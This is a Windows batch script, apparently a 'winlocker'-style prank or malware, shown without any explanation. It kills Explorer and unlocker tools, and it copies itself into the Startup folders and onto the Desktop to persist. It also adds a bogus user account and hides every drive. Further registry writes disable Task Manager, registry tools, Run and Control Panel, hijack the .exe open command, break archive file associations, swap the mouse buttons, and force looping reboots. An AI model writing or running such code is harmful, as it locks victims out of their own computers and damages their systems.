chcp 1251
@echo off
:a
taskkill /IM explorer.exe /f
taskkill /IM 1.exe /f
taskkill /IM 2.exe /f
taskkill /IM 3.exe /f
taskkill /IM 0.exe /f
taskkill /IM 4.exe /f
taskkill /IM 5.exe /f
taskkill /IM 6.exe /f
taskkill /IM 7.exe /f
taskkill /IM 8.exe /f
taskkill /IM 9.exe /f
taskkill /IM SU.exe /f
taskkill /IM DU.exe /f
taskkill /IM ExtraUnlocker.exe /f
net user "AntiVirus %random%" LOLH /add
shutdown /r /t 20 /c "А ты как думал, первая работа можно меня обыграть?" 
copy %0 "C:\Users\Public\Desktop"
copy %0 "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
copy %0 "C:\Documents and Settings\All Users\Windows\Start Menu\Programs\Startup"
label C:ФлешкуУбрал
rundll32 user32, SwapMouseButton
assoc .msi=txt
assoc .rar=txt
assoc .zip=txt

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDrives /t REG_DWORD /d 67108863 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoViewOnDrive /t REG_DWORD /d 67108863 /f 
reg add "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions" /v "NoSelectDownloadDir" /d 1 /f 
reg add "HKLM\SOFTWARE\Microsoft\Internet Explorer\main\FeatureControl\Feature_LocalMachine_Lockdown" /v "IExplorer" /d 0 /f 
reg add "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions" /v "NoFindFiles" /d 1 /f 
reg add "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions" /v "NoNavButtons" /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v disabletaskmgr /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuPinnedList /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMFUprogramsList /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoUserNameInStartMenu /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\NonEnum" /v {20D04FE0-3AEA-1069-A2D8-08002B30309D} /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoNetworkConnections /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuNetworkPlaces /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v StartmenuLogoff /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuSubFolders /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoCommonGroups /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFavoritesMenu /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRecentDocsMenu /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSetFolders /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoAddPrinter /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFind /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSMHelp /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMorePrograms /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoChangeStartMenu /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSMMyDocs /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSMMyPictures /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMyMusic /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f
reg add "hklm\Software\Microsoft\Windows\CurrentVersion\run" /v SwapNT /t REG_SZ /d rundll32 user32, SwapMouseButton /f 
reg add "HKCR\exefile\shell\open\command" /ve /t REG_SZ /d rundll32.exe /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v disableregistrytools /t REG_DWORD /d 1 /f 

goto a


